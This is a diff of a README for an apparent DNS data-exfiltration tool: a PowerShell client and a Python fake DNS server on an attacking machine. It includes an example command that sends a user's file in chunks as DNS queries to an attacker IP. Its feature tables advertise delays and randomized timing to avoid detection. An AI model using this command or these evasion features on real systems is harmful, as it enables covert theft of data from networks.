@@ -79,29 +79,21 @@ PARAMETERS
     PS C:\>.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt -Length 32 -Timeout 10 -Hash
 
     DNS queries will be like [32-long-chunk].fakedomain.com and will be going out every 10 seconds
-
-    
-
-
-
-
 ```
+<br>
+---
 
-### Features
+### Features and @TODOs
 | | |
 | ------ | ------ | 
 | :heavy_check_mark:  | Set timeout between DNS requests to slow down exfiltration and prevent detection |
 | :heavy_check_mark:  | Set random timeout between requests to prevent periodically checks detection |
 | :heavy_check_mark:  | Set fake domain or legit domain for DNS queries, the DNS server listening on your machine will respond to both |
 | :heavy_check_mark:  | Set custom exfiltration third level domain chunks length |
-| :heavy_check_mark:  | Optional: print server's response as record A resolution to verify queries |
-
-### @todo
-| | |
-| ------ | ------ |
-| :large_blue_circle: | Send filename as first action |
-| :large_blue_circle: | Compress exfiltrating files to make the transfer faster |
-| :large_blue_circle: | Optional: md5 file hash trasmission before file content for integrity checks|
+| :heavy_check_mark:  | Send filename as first action |
+| :hevay_check_mark:  | Optional: md5 file hash trasmission before file content for integrity checks|
+| :large_blue_circle: | Optional: print server's response as record A resolution to verify queries |
+| :large_blue_circle: | Optional: Compress files to exfiltrate to speed up the process |
 | :white_circle:      | Optional: file encryption to prevent network sniffers to rebuild exfiltrated artifacts |
 | :white_circle:      | Optional: Send multiple files at once |
 | :white_circle:      | Optional: Send entire directory as compressed file |
@@ -112,20 +104,16 @@ PARAMETERS
 ## Fake DNS Server
 Developed with Python3, the server module will provide a simple fake DNS server to get client's queries from your attacking machine, and responde with a spoofed IP of your choice (default is google.com's).
 
-### Features
+### Features and @TODOs
 | | |
 | ------ | ------ | 
 | :heavy_check_mark:  | Set custom IP to spoof as record A response |
 | :heavy_check_mark:  | Set custom domain for further automated file decode |
 | :heavy_check_mark:  | Set custom UDP port for DNS service (default is 53) |
-
-### @todo
-| | |
-| ------ | ------ | 
 | :large_blue_circle: | Get filename from exfiltration first chunk |
 | :large_blue_circle: | Optional: automated file decode/save |
 | :large_blue_circle: | Compression receiving capabilities |
-| :white_circle: | Optional: file decryption and save |
+| :white_circle:      | Optional: file decryption and save |
 
 <br>
 <br>
